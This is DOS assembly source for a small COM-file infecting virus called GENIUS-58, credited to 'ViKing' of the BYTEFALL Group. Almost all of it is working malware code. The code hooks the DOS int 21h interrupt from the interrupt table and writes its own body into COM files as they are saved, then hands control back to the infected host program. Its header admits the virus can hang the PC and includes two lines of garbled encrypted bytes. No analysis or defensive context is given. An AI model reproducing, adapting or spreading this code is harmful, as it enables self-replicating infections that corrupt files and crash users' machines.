;Virus from ViKing.Genius family
;Virus GENIUS-58 - Can hang up the PC :(
;CopyWrited (c) by ??? in 1995
;Portions CopyWrite (c) 1995,97 His Majesty ViKing
;ViKing is a member of BYTEFALL Group
;Crypted Here->|{HP��f.{LM_�㱃]�o������x1)PT[�3�*|	!G��X�<�Ş�
;Crypted Here->d`B�E�'v{v���8��C�����
;----------------------------------------------------------------------
.model tiny
.code
.286
;----------------------------------------------------------------------
LoaderSize      equ     offset NewInt - offset Start
VirusSize       equ     offset END_OF_VIR - offset Start
INT_NUM         equ     (LoaderSize*10h + VirusSize) /4
;----------------------------------------------------------------------
                org     100h

Start:
                cli                             ;Specially For int 9,8,1C...
;                pusha
                push    si                      ;SI=IP=100h

                scasw                           ;DI=SP=FFFEh => DI=0
                mov     al,LoaderSize
                mov     bl,84h - VirusSize
                mov     es,ax
                mov     cl,VirusSize
                rep     movsb                   ;Move VirusBody to IntTable

;                mov     ds,cx
                pop     ds

                xchg    ax,[di+bx]              ;Set int 21h
                cmp     al,LoaderSize
                jz      CureOwner
                stosw
                mov     ax,es
                xchg    ax,[di+bx]
                stosw
CureOwner:
                push    cs
                pop     es

                push    cs
                pop     ds

                pop     di                      ;DI=Old SI=100h
                sub     cx,si                   ;CX=0,SI=END_OF_VIR=>CX=OwnerSize

                rep     movsb                   ;Move OwnerBody to 100h
;                popa
;                sti
                jmp     short Start

NewInt:
                pusha
                mov     si,dx                   ;Is WriteBuff consisted of
                lodsb                           ;COM-file start?
                cmp     ax,40E9h                ;Write-func of int 21h?
                jne     ExitFromInt

                push    ds                      ;Write VirusBody
                push    cs
                pop     ds
                cwd
                mov     cx,VirusSize
;                int     INT_NUM
                int     21h                     ;Sorry... Can clear stack
                pop     ds                      ;2 pusha are too much...
                ;AND then... Write OwnerBody.
ExitFromInt:
                popa
                DB      0EAh

END_OF_VIR:
;----------------------------------------------------------------------
;Owner Body
                mov     dx,offset String - VirusSize
                mov     ah,9
                int     21h
                int     20h
String          db      "Pay Attention !!! This file is infected by ViKing.Genius virus...$"
;----------------------------------------------------------------------
                end Start